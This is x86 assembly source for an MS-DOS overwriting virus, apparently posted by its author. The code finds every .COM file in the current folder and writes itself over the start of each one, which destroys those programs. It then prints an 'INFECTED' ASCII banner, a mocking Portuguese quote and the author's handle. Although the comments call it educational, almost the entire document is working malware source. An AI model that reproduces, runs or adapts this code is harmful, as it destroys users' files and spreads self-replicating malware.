;Virus that overwrite COM files at the same folder.
;Made in x86 Assembly with TASM, works in MS-DOS & DOS-Box
;This virus is just for educational purposes!!!

.model small
.code
org 100H

start:
		
		mov ah, 4Eh 
		mov dx, offset COM_FILE
		int 21h ;interrupt
		
INFECT_LOOP:		jc EXIT_DOS ;jump to EXIT_DOS

		mov dx, 9Eh ;get the filename from the DTA
		mov ax, 3D01h ;open file with writing permissions
		int 21h ;interrupt
		xchg ax, bx ;put file handle into bx
		mov dx, 0100h
		mov cx, offset ENDVIRUS-start ;size of virus
		mov ah, 40h
		int 21h ;interrupt
		mov ah, 3Eh
		int 21h ;interrup
		mov ah, 4Fh
		int 21h ;interrupt
		jmp INFECT_LOOP ;jump to INFECT_LOOP
		
EXIT_DOS:

		mov dx, offset TXT1 
		mov ah, 09h
		int 21h
		mov dx, offset TXT2
		mov ah, 09h
		int 21h
		mov dx, offset TXT3
		mov ah, 09h
		int 21h
		mov dx, offset TXT4
		mov ah, 09h
		int 21h
		mov dx, offset TXT5
		mov ah, 09h
		int 21h
		mov dx, offset TXT6
		mov ah, 09h
		int 21h
		mov dx, offset TXT7
		mov ah, 09h
		int 21h
		mov dx, offset TXT8
		mov ah, 09h
		int 21h
		mov dx, offset TXT9
		mov ah, 09h
		int 21h
		mov dx, offset TXT95
		mov ah, 09h
		int 21h
		mov dx, offset TXT10
		mov ah, 09h
		int 21h
		mov dx, offset TXT11
		mov ah, 09h
		int 21h
		mov dx, offset TXT12
		mov ah, 09h
		int 21h
		mov dx, offset TXT13
		mov ah, 09h
		int 21h
		mov ax, 4C00h ;return to MS-DOS
		int 21h
		
COM_FILE db '*.COM',0h 
;strings:
TXT1 db "#####################################################",0dh,0ah,"$"
TXT2 db "#  												 #",0dh,0ah,"$"
TXT3 db "#  #  ##   #  ####  ####  ####  #####  ####  ###	 #",0dh,0ah,"$"
TXT4 db "#  #  # #  #  #     #     #	   #	#     #  #   #",0dh,0ah,"$"
TXT5 db "#  #  #  # #  ###   ###   #	   #	###   #   #  #",0dh,0ah,"$"
TXT6 db "#  #  #   ##  #     #     #	   #    #     #  #   #",0dh,0ah,"$"
TXT7 db "#  #  #    #  #     ####  ####    #	####  ###    #",0dh,0ah,"$"
TXT8 db "#  												 #",0dh,0ah,"$"
TXT9 db "#####################################################",0dh,0ah,"$"
TXT95 db "----------------------------------------------------",0dh,0ah,"$"
TXT10 db "'Ah e so uma gripezinha! Nao e nada de mais.'",0dh,0ah,"$"
TXT11 db "'Ainda mais com meu historico de atleta.'",0dh,0ah,"$"
TXT12 db "Virus by: ArTic/JhoPro",0dh,0ah,"$"
TXT13 db "Discord: ArTic#1892",0dh,0ah,"$"

ENDVIRUS:

		end start